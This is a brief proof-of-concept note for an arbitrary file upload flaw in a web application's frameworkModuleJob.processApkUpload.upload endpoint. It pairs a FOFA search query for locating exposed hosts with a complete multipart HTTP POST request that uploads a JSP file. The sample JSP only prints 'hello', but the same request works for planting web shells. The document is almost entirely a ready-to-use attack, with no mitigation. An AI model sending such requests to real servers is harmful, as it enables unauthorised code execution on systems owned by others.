# fofa
```plain
body="frameworkModuleJob"
```

# poc
```plain
POST /ajaxinvoke/frameworkModuleJob.processApkUpload.upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx

------WebKitFormBoundaryFQqYtrIWb8iBxUCx
Content-Disposition: form-data; name="Filedata"; filename="qwe.jsp"
Content-Type: application/octet-stream

<% out.print("hello"); %>
------WebKitFormBoundaryFQqYtrIWb8iBxUCx--

```

